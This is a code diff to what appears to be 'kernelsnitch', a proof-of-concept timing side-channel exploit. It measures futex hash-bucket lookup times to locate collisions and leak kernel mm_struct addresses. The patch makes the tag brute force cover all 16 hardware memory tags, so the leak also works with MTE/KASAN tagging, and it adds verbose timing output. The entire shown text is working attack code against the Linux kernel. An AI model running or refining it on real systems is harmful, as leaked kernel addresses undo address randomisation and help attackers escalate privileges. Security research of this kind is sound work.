@@ -199,6 +199,7 @@ struct mm_leak_arg {
     struct kernelsnitch_shared_state *ks;
     struct range range;
 };
+
 static void *__mm_leak(void *arg)
 {
     struct mm_leak_arg *mm_leak_arg = (struct mm_leak_arg *)arg;
@@ -223,8 +224,10 @@ static void *__mm_leak(void *arg)
                         break;
                     }
                 } else {
-                    // need to set the tag if mte is enabled
-                    for (size_t tag_candidate = 0; tag_candidate < 15 && !ks->found; ++tag_candidate) {
+                    // KASAN_HW_TAGS: tag format is 0xF<x> in the top byte
+                    // (mte_get_ptr_tag: 0xF0 | (ptr >> MTE_TAG_SHIFT)), so
+                    // the top nibble stays 0xF.  Try tags 0-15.
+                    for (size_t tag_candidate = 0; tag_candidate < 16 && !ks->found; ++tag_candidate) {
                         size_t __mm_struct_candidate = mm_struct_candidate & ~(0xfULL << 56);
                         __mm_struct_candidate |= (tag_candidate << 56);
                         found_hash = 1;
@@ -337,6 +340,7 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
     size_t approx_time = MIN(
         __measure(ks, (size_t)&ks->futexes[0]),
         __measure(ks, (size_t)&ks->futexes[KS_PAGE_SIZE+8]));
+    if (ks->verbose) pr_info("approx_time %zu\n", approx_time);
 
     // piled-up hash bucket ID 128
     // here, I append 4096 futexes to this hash bucket creating a distinction between most other empty or lightly populated ones
@@ -352,6 +356,8 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
             break;
         futex_addr = (size_t)&ks->futexes[id];
         ks->times[i] = __measure(ks, futex_addr);
+        if (ks->verbose)
+            pr_info("measure i=%zu time=%zu\n", i, ks->times[i]);
         if (ks->times[i] > (approx_time*KERNELSNITCH_THRESHOLD_MULT)) {
             count++;
             ks->futex_addrs[count] = futex_addr;
